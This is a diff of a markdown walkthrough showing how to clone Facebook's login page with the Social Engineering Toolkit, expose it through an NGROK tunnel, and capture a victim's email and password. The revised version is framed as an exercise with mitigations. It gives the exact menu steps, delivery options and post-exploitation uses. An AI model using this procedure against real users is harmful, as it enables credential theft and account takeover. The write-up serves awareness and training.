@@ -1,94 +1,116 @@
-### Phishing campaign documentation
+# Credential Harvesting via Phishing Attack – Facebook Clone
 
-The campaign's purpose is launch a phishing for Facebook credentials attack using setoolkit(tool) for further use in other explorations using matching credentials
-with using the gathered credentials as like: passwords or even emails or phone number synchronized with.
+---
 
-Goal: Impersonate the Facebook webpage connected to a web server running in a virtual machine like Kali Linux or similar Linux environment.
+## 1. Summary
 
-## Credential Harvest attack walkthrough 
+**Objective:**  
+Simulate a credential harvesting attack targeting Facebook users by deploying a phishing campaign using the **Social Engineering Toolkit (SET)**. The intent was to demonstrate how attackers can gather valid credentials for potential post-exploitation actions.
 
-*First steps*
+**Method:**  
+A cloned version of Facebook’s login page was hosted on a Kali Linux virtual machine using SET. The site was made publicly accessible via an NGROK tunnel and delivered to the target to collect login credentials.
 
-Create the web page that'll be impersonating the Facebook web page. For this i had use the Social Engineering Tool Kit(setoolkit) running these commands: 
-	
-	$sudo setoolkit
+---
 
-and pops out this screen with these options:
-![image](/imgs/Screenshot%202025-07-01%20221450.png)
--- The Ilustration--
+## 2. Tools and Environment
 
+- **Operating System:** Kali Linux (VM)
+- **Tool Used:** Social Engineering Toolkit (SET)
+- **Tunnel Service:** NGROK
+- **Targeted Service:** Facebook (cloned login interface)
 
-After we review the menu we select the 1st option listed as: "1) Social-Engineering Attacks", the pops out another screen with others options where we must to chose the 2nd option listed as: "2) Website Attack Vectors"
+---
 
-![image](/imgs/image.png)
+## 3. Attack Chain
 
--- The Ilustration--
+### 3.1 Launching SET
 
-Now we have another menu with some explanation of each attack and their uses:
-![image](/imgs/Screenshot%202025-07-01%20222725.png)
---The Ilustration--
+Executed the following command:
 
-After review all the information about each one attack, the one that fits better in our scenario is the 3th option listed as: "3) Credential Harvest Attack Method".
-This option allows to clone a web site by using a specific url. i.e: http://www.facebook.com(in our case we used Facebook).
+```bash
+sudo setoolkit
+Selected the following options:
 
-*Note* The url must have a HTTP protocol instead a HTTPS protocol. This is to avoid to be detected blocked by the Facebook's certificate authories.
+1) Social-Engineering Attacks
 
-After select the 3th option in the menu, this another screen will pops out:
-![image](/imgs/Screenshot%202025-07-01%20223603.png)
---The Ilustration--
+2) Website Attack Vectors
 
-Here we must select the 2nd option listed as: "2) Site Cloner", and this is the output:
-![image](/imgs/Screenshot%202025-07-01%20223941.png)
---The ilustration--
+3) Credential Harvester Attack Method
 
-Now you must to set up the attack. The first choice is the IP adress of receiver(Your IP adress or your server's IP).
+2) Site Cloner
 
-In this camping were used NGROK as the server tunel to my virtual machine, but you can use your own IP adress for it.
+3.2 Cloning the Target
+Cloning URL: http://facebook.com
 
-After set up your server(or IP adress) to receive the data came from the user(the victim) you must to give the URL from the page you want to clone.
-![image](/imgs/Screenshot%202025-07-01%20224532.png)
--- The Ilustration--
+IP Address / NGROK URL: <NGROK_URL>
 
-This is the output after the URL set up:
+Note: HTTPS was avoided to prevent certificate mismatch issues.
 
-![image](/imgs/Screenshot%202025-07-01%20224822.png)
--- The Ilustration--
+Example configuration:
 
-Now you just copy the server adress or your machine adress and send to the victm.
+bash
+Copy
+Edit
+IP address for the POST back: <NGROK_URL>
+Website to clone: http://facebook.com
+SET cloned the target site and hosted it locally via Apache.
 
-## The attack delivery
+4. Delivery Mechanism
+The cloned page was shared via the NGROK URL. Delivery can occur through various social engineering methods:
 
-Now your have a several options to deliver the attack. Mostly of Social-Engineering attacks happens through email, but there's a lot more ways as like: SMS, Phone calls impersonating the Facebook support center contact.
+Phishing emails
 
-*Note* I'll not deep dive into Social-Engineering operations because the purpose of this documentation is just to show how phishing could be exploit by an attacker. 
+SMS messages
 
-## The Attack
+Fake support calls
 
-Passed all the Steps, now is the time to gathers and analyze the information coming from target(the victim).
+⚠️ Disclaimer: Delivery methods were not the focus of this exercise.
 
-- Fist: The victim receives the link, and this is screen after cliked on it:
-![image](/imgs/Screenshot%202025-07-01%20225722.png)
--- The Ilustration --
+5. Execution and Result
+5.1 Victim Interaction
+When the victim clicked the NGROK link, the Facebook login clone was displayed. Upon entering credentials, the data was captured and shown on the attacker's terminal.
 
-Looks exactly the same as the Facebook's login page !
+Captured fields:
 
-The victim will put the credentials on the browser and you will receive the output from the Email and Password fields on your server or terminal if you chose to put your machine ip.
+Email / Phone
 
-## The information
+Password
 
-After all this is the output you'll receive:
-![image](/imgs/Screenshot%202025-07-01%20230301.png)
--- The Ilustration --
+5.2 Captured Output
+Example:
 
-Voilà ! Now you have the headers containing the user and password. You must to manipulate the request and fill with this information. 
+yaml
+Copy
+Edit
+[*] WE GOT A HIT! Printing the output:
+PARAM: email=targetuser@example.com
+PARAM: pass=supersecretpassword123
+6. Post-Exploitation Potential
+Captured credentials may allow:
 
-## The final
-This is an basic explanation about Credential Harvest Attack using Social-Engineering techniques to achieve the goal. 
+Unauthorized access to Facebook or associated accounts
 
-To feel confident with this kind of attacks you need to reseach some resources to learn more deeply into Social-Engineering techniques, and take a deep knowledge of that. My purpose here is just to show as a simple way to launch this attack.
+Credential reuse in other platforms
 
-Best Regards.
+Social engineering via phone/email
 
-Marcelo Lones | Cyber Security Specialist
+MFA bypass attempts via SIM swap or phishing
 
+7. Mitigation Recommendations
+Enforce HTTPS and HSTS
+
+Enable multi-factor authentication
+
+Educate users on phishing tactics
+
+Use anti-phishing browser extensions
+
+Monitor for cloned or typosquatted domains
+
+8. Conclusion
+This phishing exercise successfully demonstrated how an attacker could use SET to clone a legitimate website and capture credentials. Despite its simplicity, the method is effective and reinforces the need for strong security awareness and defensive controls.
+
+Performed by:
+Marcelo Lones
+Cybersecurity Analyst / Offensive Security Enthusiast
 
